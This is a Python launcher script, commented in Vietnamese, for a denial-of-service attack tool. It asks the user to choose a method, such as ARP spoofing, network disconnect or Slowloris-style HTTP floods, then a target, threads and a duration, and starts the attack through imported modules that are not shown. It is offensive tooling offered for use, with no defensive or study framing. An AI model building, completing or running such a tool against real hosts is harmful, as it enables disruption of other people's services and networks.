#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Main script to start GUI DoS attack application.
Phiên bản cải tiến với cấu trúc module rõ ràng, logging và xử lý lỗi chuyên nghiệp.
"""

import os
import sys
import logging
import subprocess

# Thiết lập logging với định dạng chuyên nghiệp
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt='%H:%M:%S'
)

def install_package(package_name):
    """
    Cài đặt package nếu chưa có.
    """
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
        logging.info(f"Đã cài đặt package: {package_name}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Lỗi cài đặt {package_name}: {e}")
        sys.exit(1)

# Kiểm tra và cài đặt colorama nếu cần
try:
    from colorama import Fore, init as colorama_init
except ImportError:
    logging.info("colorama chưa được cài đặt. Đang cài đặt...")
    install_package("colorama")
    from colorama import Fore, init as colorama_init

# Khởi tạo colorama (đặc biệt quan trọng trên Windows)
colorama_init(autoreset=True)

# Thay đổi thư mục làm việc đến vị trí của file script
script_dir = os.path.dirname(os.path.realpath(__file__))
os.chdir(script_dir)
os.system("cls" if os.name == "nt" else "clear")

# Kiểm tra các thư viện cần thiết
try:
    from tools.addons.checks import (
        check_http_target_input,
        check_local_target_input,
        check_method_input,
        check_number_input,
    )
    from tools.addons.ip_tools import show_local_host_ips
    from tools.addons.logo import show_logo
    from tools.method import AttackMethod
except ImportError as err:
    logging.error(f"Không thể import các module yêu cầu: {err}")
    sys.exit(1)


def configure_attack():
    """
    Cấu hình các thông số cho cuộc tấn công.
    """
    method = check_method_input()
    if method in ["arp-spoof", "disconnect"]:
        show_local_host_ips()

    if method not in ["arp-spoof", "disconnect"]:
        target = check_http_target_input()
        threads = check_number_input("threads")
    else:
        target = check_local_target_input()
        threads = 1

    duration = check_number_input("time")
    sleep_time = check_number_input("sleep time") if "slowloris" in method else 0

    logging.info("Cấu hình tấn công hoàn tất.")
    return method, target, threads, duration, sleep_time


def start_attack(method, target, threads, duration, sleep_time):
    """
    Khởi động cuộc tấn công với các tham số đã cấu hình.
    """
    try:
        with AttackMethod(
            duration=duration,
            method_name=method,
            threads=threads,
            target=target,
            sleep_time=sleep_time,
        ) as attack:
            attack.start()
    except Exception as e:
        logging.error(f"Lỗi khi khởi động tấn công: {e}")
        sys.exit(1)


def main():
    """
    Main function chạy ứng dụng.
    """
    show_logo()
    try:
        method, target, threads, duration, sleep_time = configure_attack()
        start_attack(method, target, threads, duration, sleep_time)
    except KeyboardInterrupt:
        logging.warning("Phát hiện Ctrl+C. Đóng chương trình.")
    except Exception as e:
        logging.error(f"Lỗi không mong muốn: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()